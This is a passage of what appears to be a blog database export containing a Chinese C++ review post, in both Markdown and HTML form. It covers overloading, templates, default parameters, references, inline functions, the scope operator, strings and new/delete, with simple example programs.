0;\n\t}\n```\n::a表示全局变量a。注意不能用::访问局部变量。\n\n**0×08：字符串变量**\n\nC++提供了字符串类类型string，实际上它不是C++的基本类型，它是在C++标准库中声明的一个字符串类，程序可以用它定义对象。\n\t1.定义字符串变量\n\t格式：  string 变量名表;\n\t可以在定义变量时用字符串常量为变量赋初值：\n\t\t\tstring   变量名 = 字符串常量\n\t**注意**：`如用字符串变量，在程序开始要用包含语句把C++标准库的string头文件包含进来。`\n\n2.对字符串操作\n① 对字符串变量赋值\n \t字符串变量= 字符串表达式\n例： string  st1,st2;\n \t   st1 = “王点点“;\n \t   st2 = st1;\n \t  \n ②  访问字符串中的字符\nC++允许把字符串作为字符数组，第一个字符的下标是0，第二个字符的下标是1，以此类推。\n例：string  w = “ then”;\n \t  w[2] = ‘e’;\n结果字符串w变成 than\n\n③输入输出字符串\n格式：cin >> 字符串变量\n           cout << 字符串变量\n\n④字符串连接运算\n格式：字符串1 + 字符串2\n功能：把连接运算符两端的字符连接成一个字符串。表达式中可以用字符串常量也可以用字符串变量。\n例：string  st1=“C++”;\n \t  string  st2=“Language”;\n \t  st1 = st1 + st2 ;\n结果是 C++Language\n\n⑤字符串的比较运算\n\t可以用关系运算符>、>=、==、!=、<、<=对两个字符串同一位置的字符进行比较，根据ASCII码值判定字符的大小。\n\t例：”china” > “chinese”\n\t运算结果是假。\n\n**0×09：动态分配/撤销内存的运算符new和delete** \n\n分配内存运算\nnew  类型 [ （初值）]\n类型是决定分配空间尺寸的关键元素，如果运算结果正确，它的值是分配内存空间的起始地址，否则返回NULL。\n\n```\n例：int  *a =new int ;\n \t  int  *b =new int( 100);\n \t  char *ch = new char[10];\n \t  int * q = new int [5][4];\n  \t  float  * p = new float(3.14159);\n```\n归还动态内存运算\ndelete[] 指针变量\n[] 代表数组，如果不是数组可以省略[]。\n运算功能：撤销指针变量所指的动态内存空间，指针变量的数据类型决定了空间尺寸的大小。\n\n```\n例：char *p=new char[10];\n        … …\n \t delete [ ] p;\n```\n\n```\n例1.18用动态内存存放结构体变量\n#include <iostream>\n#include <string.h>\nusing namespace std;\nstruct student \n{char name [10];\n int num;\n char sex;\n};\nint main ( )\n{student *p;\n p=new student;\n strcpy(p->name,\"Wang Fun\");\n p->num=10123;\n p->sex='M';\n cout<<p->name<<\"  \"<<p->num<<\"  \"<<p->sex<<endl;\n delete p;\n return 0;\n}\n```\n先声明了一个结构体类型student，定义一个指向它的指针变量p，用new开辟一个空间存放一个student类型变量。\n如果无法正常分配内存，运算会返回一个空指针NULL，程序可以设计判断结构，根据判断结果决定怎样操作。\n注意不要混合使用new、delete、malloc、free。要正确搭配，不要用new分配内存后，又用free释放内存。\n\n\n明天继续复习！！！\n","slug":"C++复习——函数模板和函数的重载","published":1,"updated":"2020-06-05T09:33:27.164Z","comments":1,"layout":"post","link":"","_id":"ckchhpsfz00009kq650nv87wf","content":"<p>﻿前言：慢慢复习路！！！</p>\n<p>目录：<br>0×01：函数的重载<br>0×02：函数的模板<br>0×03：有默认参数的函数<br>0×04：变量的引用<br>0×05：将引用作为函数参数<br>0×06：内置函数<br>0×07：作用域运算符<br>0×08：字符串变量<br>0×09：动态分配/撤销内存的运算符new和delete</p>\n<p><strong>0×01：函数的重载</strong><br>          定义：C++允许在同一个域中用一个函数名定义多个函数，这些函数的参数个数、参数类型不相同。用一个函数名实现不同的功能，就是函数的重载。</p>\n<p>例一：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int max(int a,int b,int c)           &#x2F;&#x2F;求3个整数中的最大者</span><br><span class=\"line\">&#123; if (b&gt;a) a&#x3D;b;</span><br><span class=\"line\">if (c&gt;a) a&#x3D;c;</span><br><span class=\"line\">return a; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">float max(float a,float b, float c)  &#x2F;&#x2F;求3个实数中的最大者</span><br><span class=\"line\">&#123;if (b&gt;a) a&#x3D;b;</span><br><span class=\"line\"> if (c&gt;a) a&#x3D;c;</span><br><span class=\"line\"> return a; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">long max(long a,long b,long c)  &#x2F;&#x2F;求3个长整数中的最大者</span><br><span class=\"line\">&#123;if (b&gt;a) a&#x3D;b;</span><br><span class=\"line\"> if (c&gt;a) a&#x3D;c;</span><br><span class=\"line\"> return a;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>例二：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int main( )</span><br><span class=\"line\">&#123;int a,b,c;  float d,e,f;  long g,h,i;</span><br><span class=\"line\">cin&gt;&gt;a&gt;&gt;b&gt;&gt;c; </span><br><span class=\"line\">cin&gt;&gt;d&gt;&gt;e&gt;&gt;f;</span><br><span class=\"line\">cin&gt;&gt;g&gt;&gt;h&gt;&gt;i;</span><br><span class=\"line\">int m;</span><br><span class=\"line\">m&#x3D; max(a,b,c);                        &#x2F;&#x2F;函数值为整型</span><br><span class=\"line\">cout &lt;&lt;&quot;max_i&#x3D;&quot;&lt;&lt;m&lt;&lt;endl;</span><br><span class=\"line\">float n;</span><br><span class=\"line\">n&#x3D;max(d,e,f);                          &#x2F;&#x2F;函数值为实型</span><br><span class=\"line\">cout&lt;&lt;&quot;max_f&#x3D;&quot;&lt;&lt;n&lt;&lt;endl;</span><br><span class=\"line\">long int p;</span><br><span class=\"line\">p&#x3D;max(g,h,i);                          &#x2F;&#x2F;函数值为长整型</span><br><span class=\"line\">cout&lt;&lt;&quot;max_l&#x3D;&quot;&lt;&lt;p&lt;&lt;endl;</span><br><span class=\"line\">return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>例三：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">下面的例子说明用函数重载设计参数个数不同的函数，用一个函数名求两个整数或三个整数中的最大数。</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">int max(int a,int b,int c)     &#x2F;&#x2F;求3个整数中的最大者</span><br><span class=\"line\">&#123;if (b&gt;a) a&#x3D;b;</span><br><span class=\"line\"> if (c&gt;a) a&#x3D;c;</span><br><span class=\"line\"> return a;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>注意：<code>不允许函数参数个数、参数类型都相同，只是函数返回值不同。因为系统无法从调用形式上判断调用与哪个函数相匹配。</code></p>\n<p><strong>0×02：函数的模板</strong></p>\n<p>定义：如果两个函数的参数个数相同，函数的行为相同（做同样的事），只是函数和参数的数据类型不同，如果用函数重载的话，编写的函数代码是相同的，为了节省时间，C++提供了函数模板功能。(C++比C语言方便多了，小声bb)</p>\n<p>格式：<br>    template typename 标识符[, typename 标识符, … … ]<br>    函数定义（函数的类型和参数的类型用声明的标识符表示）<br>template    是关键字，含义是模板<br>    typename  是关键字，表示其后的标识符代表类型参数，调用时根据实参的类型确定形参的类型。<br>    所谓函数模板，是建立一个通用函数，不指定函数类型和参数类型，而用一个虚拟的类型表示。在调用函数时，用实参的类型取代模板中的虚拟类型。</p>\n<p>例1  为计算两个数中的大数定义函数模板</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">template &lt;typename T&gt;</span><br><span class=\"line\">T max(T a,T b,T c)  &#x2F;&#x2F;用虚拟类型T表示类型</span><br><span class=\"line\">&#123;if(b&gt;a) a&#x3D;b;</span><br><span class=\"line\"> if(c&gt;a) a&#x3D;c;</span><br><span class=\"line\"> return a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;int i1&#x3D;8,i2&#x3D;5,i3&#x3D;6,i;</span><br><span class=\"line\"> double d1&#x3D;56.9,d2&#x3D;90.765,d3&#x3D;43.1,d;</span><br><span class=\"line\"> long g1&#x3D;67843,g2&#x3D;-456,g3&#x3D;78123,g;</span><br><span class=\"line\"> i&#x3D;max(i1,i2,i3);</span><br><span class=\"line\"> d&#x3D;max(d1,d2,d3);</span><br><span class=\"line\"> g&#x3D;max(g1,g2,g3);</span><br><span class=\"line\"> cout&lt;&lt;&quot;i_max&#x3D;&quot;&lt;&lt;i&lt;&lt;endl;</span><br><span class=\"line\"> cout&lt;&lt;&quot;d_max&#x3D;&quot;&lt;&lt;d&lt;&lt;endl;</span><br><span class=\"line\">cout&lt;&lt;&quot;g_max&#x3D;&quot;&lt;&lt;g&lt;&lt;endl;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>注意：<code>从程序中看到，此问题用函数模板比用函数重载更方便。注意，函数模板只适用于函数参数的个数相同而类型不同，并且函数体相同的情况，如果函数的参数个数不同，则不能用函数模板。</code><br><strong>0×03：有默认参数的函数</strong></p>\n<p>C++允许为函数的参数设置默认值，这时调用函数时，如果没有实参，就以默认值作为实参值。<br>    格式：<br>    形参类型  形参变量名 = 常数<br>    功能：调用函数时，如果没有实参，就以常数作为该形参的值;如果有实参，仍以实参的值作为该形参的值。<br>    注意：<code>有默认值的形参必须放在形参表的右边，不允许无默认参数值和有默认参数值的形参交错排列。</code></p>\n<p>字面意思不好理解，例子奉上。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">编写计算圆柱体体积函数</span><br><span class=\"line\">\tfloat  volume ( float h, float r &#x3D; 12.5)</span><br><span class=\"line\"></span><br><span class=\"line\">\t调用可以采用以下任何一种形式：</span><br><span class=\"line\">\tvolume( 45.6);</span><br><span class=\"line\">\tvolume( 32.5, 10.5);</span><br><span class=\"line\">\t函数参数结合从左到右，用第一种方式调用时，只有一个实参，圆半径的值取默认值12.5，用第二种方式调用时，有两个实参，圆半径的值取实参的值10.5。</span><br></pre></td></tr></table></figure>\n<p>注意：<code>一、如果用函数原型声明，只要在函数原型声明中定义形参的默认值即可。\n二、一个函数名不能同时用于重载函数和带默认形参值的函数。当调用函数时，如少写一个参数，系统无法判断是利用重载函数还是利用带默认参数值的函数，出现二义性。</code></p>\n<p><strong>0×04：变量的引用</strong></p>\n<p>C++提供了为变量取别名的功能，这就是变量的引用。<br>格式： 类型   &amp;变量1 = 变量2<br>变量2是在此之前已经定义过的变量，且与变量1的类型相同。这里为变量2定义一个别名变量1，在程序里变量1和变量2 就是同一个变量。<br>注意：两个变量不能用同一个别名。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：int a &#x3D; 3 ,b &#x3D;4;</span><br><span class=\"line\">\t       int &amp;c &#x3D; a;  &#x2F;&#x2F;   c是a 的别名</span><br><span class=\"line\">\t       int &amp;c &#x3D; b;  &#x2F;&#x2F;   错误的用法</span><br><span class=\"line\">\t一个变量可以有多个别名</span><br><span class=\"line\">\t例：int a &#x3D; 3;</span><br><span class=\"line\">\t\t  int &amp; b&#x3D; a;</span><br><span class=\"line\">\t\t  int &amp; c&#x3D; b;</span><br><span class=\"line\">\t变量a 有两个别名b和c。</span><br></pre></td></tr></table></figure>\n<p>又来</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main( )</span><br><span class=\"line\">&#123;int a&#x3D;10;</span><br><span class=\"line\"> int &amp;b&#x3D;a;    &#x2F;&#x2F;声明b是a的引用</span><br><span class=\"line\"> a&#x3D;a*a;       &#x2F;&#x2F;a的值变化了，b的值也应一起变化</span><br><span class=\"line\"> cout&lt;&lt;a&lt;&lt;&quot;  &quot;&lt;&lt;b&lt;&lt;endl;   </span><br><span class=\"line\"> b&#x3D;b&#x2F;5;        &#x2F;&#x2F;b的值变化了，a的值也应一起变化</span><br><span class=\"line\"> cout&lt;&lt;b&lt;&lt;&quot;  &quot;&lt;&lt;a&lt;&lt;endl;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>0×05：将引用作为函数参数</strong></p>\n<p>C++除了可以用普通变量、指针变量做形参外，还可以用引用变量做形参。<br>    （1）用普通变量做形参<br>    这时传递的是实参的值，在函数内形参与实参是两个不同的内存单元，对形参的修改不会影响实参的值。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：无法实现两个变量的值互换的程序</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">void swap(int a,int b)</span><br><span class=\"line\">&#123; int temp;</span><br><span class=\"line\"> temp&#x3D;a;</span><br><span class=\"line\"> a&#x3D;b;</span><br><span class=\"line\"> b&#x3D;temp;                &#x2F;&#x2F;  实现a和b的值互换</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main( )</span><br><span class=\"line\">&#123;int i&#x3D;3,j&#x3D;5;</span><br><span class=\"line\"> swap(i,j);</span><br><span class=\"line\"> cout&lt;&lt;i&lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;endl;   &#x2F;&#x2F;  i和j的值未互换</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>（2）用指针变量做形参</p>\n<p>C语言还允许用指针变量做形参，这时传递的是实参变量的地址（指针），在函数内利用这个指针访问实参变量。<br>    例1.11用指针变量做形参，实现两个变量值的交换。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">void swap(int *p1,int *p2)</span><br><span class=\"line\">&#123;int temp;</span><br><span class=\"line\"> temp&#x3D;*p1;</span><br><span class=\"line\"> *p1&#x3D; *p2;</span><br><span class=\"line\"> *p2&#x3D;temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main( )</span><br><span class=\"line\">&#123;int i&#x3D;3,j&#x3D;5;</span><br><span class=\"line\"> swap(&amp;i,&amp;j);</span><br><span class=\"line\"> cout&lt;&lt;i&lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;endl;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>3）用引用变量做形参</p>\n<p>用指针变量做形参，它将实参变量的地址传递给形参，在函数内用“*指针变量”的方式访问实参变量。我们知道引用变量是变量的别名，在调用函数时，用引用变量做的形参就成了实参变量的别名，在函数中用的形参名就是实参的别名，这样比用指针变量更直观、更方便。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：利用引用变量实现两个变量值的交换</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">void swap(int &amp;a,int &amp;b)</span><br><span class=\"line\">&#123;int temp;</span><br><span class=\"line\"> temp&#x3D;a;</span><br><span class=\"line\"> a&#x3D;b;</span><br><span class=\"line\"> b&#x3D;temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main( )</span><br><span class=\"line\">&#123;int i&#x3D;3,j&#x3D;5;</span><br><span class=\"line\"> swap(i,j);</span><br><span class=\"line\"> cout&lt;&lt;&quot;i&#x3D;&quot;&lt;&lt;i&lt;&lt;&quot;   &quot;&lt;&lt;&quot;j&#x3D;&quot;&lt;&lt;j&lt;&lt;endl;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong><em>对引用的进一步说明</em></strong><br>（1）引用变量都具有非void类型<br>（2）不能建立引用的数组<br>（3）可以建立常引用变量，不允许修改常引用变量的值<br>例： int i ;<br>        const  int &amp;a = i;<br>        a = 3;   //    错误的用法<br>        i  = 8;   //    i 不是常变量，可以修改<br>        （4）可以建立指针变量的引用变量<br>例：int i;<br>       int  *p = &amp; i;<br>       int * &amp;pt = p; // pt是p的别名变量，同时<br>                            // 也是指针变量</p>\n<p><strong>0×06：内置函数</strong></p>\n<p>C++ 提供了一种机制，在编译时，将所调用的函数的代码嵌入到调用函数代码中，在执行函数时省去了调用环节，提高了函数的执行速度。这种机制称为内置函数，有的书称内联函数。<br>    格式：<br>    inline 函数类型 函数名(形参表)<br>    {    函数体    }<br>      inline 是C++的关键字，在编译时，编译程序会把这个函数嵌入到调用函数的函数体中<br>    调用格式：   函数名（实参表）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：计算三个整数中的大数</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">inline int max(int a,int b,int c)   &#x2F;&#x2F; 这是一个内置函数，</span><br><span class=\"line\">                                                 &#x2F;&#x2F; 求3个整数中的最大者</span><br><span class=\"line\">&#123;if (b&gt;a) a&#x3D;b;</span><br><span class=\"line\"> if (c&gt;a) a&#x3D;c;</span><br><span class=\"line\"> return a;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">int main( )</span><br><span class=\"line\">&#123;int i&#x3D;7,j&#x3D;10,k&#x3D;25,m;</span><br><span class=\"line\"> m&#x3D;max(i,j,k);</span><br><span class=\"line\"> cout&lt;&lt;&quot;max&#x3D;&quot;&lt;&lt;m&lt;&lt;endl;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于在定义函数时指定它是内置函数，因此编译系统在遇到函数调用max( i,j,k ) 时就用max函数体的代码代替max( i,j,k ) ，同时用实参代替形参。调用语句m= max( i,j,k ) 就被置换成：<br>    {  a=i ; b = j ; c= k;<br>    if ( b&gt;a) a=b;<br>    if ( c&gt;a) a=c;<br>    m=a;<br>     }</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例:用内置函数计算平方根</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">inline int power(int x)       &#x2F;&#x2F;定义内置函数</span><br><span class=\"line\">&#123;return x*x;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;cout&lt;&lt;power(2)&lt;&lt;endl;</span><br><span class=\"line\"> cout&lt;&lt;power(1+1)&lt;&lt;endl;</span><br><span class=\"line\"> return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译程序遇见内置函数power时，先求出函数的实参值（1+1=2），然后用power函数体代替函数调用，调用语句变成：<br>    {  cout&lt;&lt;2<em>2&lt;&lt;endl;<br>       cout&lt;&lt;2</em>2&lt;&lt;endl;<br>    }<br>    运行结果是<br>    4<br>    4 </p>\n<p>优缺点：<code>使用内置函数可以节省程序的运行时间，但增加了目标程序的长度。所以在使用时要衡量时间和空间的得失。</code></p>\n<p><strong>0×07：作用域运算符</strong><br>直接看例子：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">局部变量和全局变量同名</span><br><span class=\"line\">\t#include &lt;iostream&gt;</span><br><span class=\"line\">\tusing namespace std;</span><br><span class=\"line\">\tfloat a&#x3D;13.5;</span><br><span class=\"line\">\tint main( )</span><br><span class=\"line\">\t&#123;    int a&#x3D;5;</span><br><span class=\"line\">\t     cout&lt;&lt;a&lt;&lt;endl;</span><br><span class=\"line\">\t     return 0;    &#125;</span><br></pre></td></tr></table></figure>\n<p>程序中有两个变量a，一个是全局变量，另一个是main函数的局部变量，根据局部变量会屏蔽同名的全局变量规则，在函数中出现的变量a是局部变量，因此输出的值是5，而不是13.5，为了在函数中访问全局变量C++提供了作用域运算符 :: ，可以用来指定要访问的作用域，可以把main函数改写成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">\tusing namespace std;</span><br><span class=\"line\">\tfloat a&#x3D;13.5;</span><br><span class=\"line\">\tint main( )</span><br><span class=\"line\">\t&#123;int a&#x3D;5;</span><br><span class=\"line\">\tcout&lt;&lt;a&lt;&lt;endl;</span><br><span class=\"line\">\tcout&lt;&lt;::a&lt;&lt;endl;</span><br><span class=\"line\">\t return 0;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>::a表示全局变量a。注意不能用::访问局部变量。</p>\n<p><strong>0×08：字符串变量</strong></p>\n<p>C++提供了字符串类类型string，实际上它不是C++的基本类型，它是在C++标准库中声明的一个字符串类，程序可以用它定义对象。<br>    1.定义字符串变量<br>    格式：  string 变量名表;<br>    可以在定义变量时用字符串常量为变量赋初值：<br>            string   变量名 = 字符串常量<br>    <strong>注意</strong>：<code>如用字符串变量，在程序开始要用包含语句把C++标准库的string头文件包含进来。</code></p>\n<p>2.对字符串操作<br>① 对字符串变量赋值<br>     字符串变量= 字符串表达式<br>例： string  st1,st2;<br>        st1 = “王点点“;<br>        st2 = st1;</p>\n<p> ②  访问字符串中的字符<br>C++允许把字符串作为字符数组，第一个字符的下标是0，第二个字符的下标是1，以此类推。<br>例：string  w = “ then”;<br>       w[2] = ‘e’;<br>结果字符串w变成 than</p>\n<p>③输入输出字符串<br>格式：cin &gt;&gt; 字符串变量<br>           cout &lt;&lt; 字符串变量</p>\n<p>④字符串连接运算<br>格式：字符串1 + 字符串2<br>功能：把连接运算符两端的字符连接成一个字符串。表达式中可以用字符串常量也可以用字符串变量。<br>例：string  st1=“C++”;<br>       string  st2=“Language”;<br>       st1 = st1 + st2 ;<br>结果是 C++Language</p>\n<p>⑤字符串的比较运算<br>    可以用关系运算符&gt;、&gt;=、==、!=、&lt;、&lt;=对两个字符串同一位置的字符进行比较，根据ASCII码值判定字符的大小。<br>    例：”china” &gt; “chinese”<br>    运算结果是假。</p>\n<p><strong>0×09：动态分配/撤销内存的运算符new和delete</strong> </p>\n<p>分配内存运算<br>new  类型 [ （初值）]<br>类型是决定分配空间尺寸的关键元素，如果运算结果正确，它的值是分配内存空间的起始地址，否则返回NULL。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：int  *a &#x3D;new int ;</span><br><span class=\"line\"> \t  int  *b &#x3D;new int( 100);</span><br><span class=\"line\"> \t  char *ch &#x3D; new char[10];</span><br><span class=\"line\"> \t  int * q &#x3D; new int [5][4];</span><br><span class=\"line\">  \t  float  * p &#x3D; new float(3.14159);</span><br></pre></td></tr></table></figure>\n<p>归还动态内存运算<br>delete[] 指针变量<br>[] 代表数组，如果不是数组可以省略[]。<br>运算功能：撤销指针变量所指的动态内存空间，指针变量的数据类型决定了空间尺寸的大小。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：char *p&#x3D;new char[10];</span><br><span class=\"line\">        … …</span><br><span class=\"line\"> \t delete [ ] p;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例1.18用动态内存存放结构体变量</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">struct student </span><br><span class=\"line\">&#123;char name [10];</span><br><span class=\"line\"> int num;</span><br><span class=\"line\"> char sex;</span><br><span 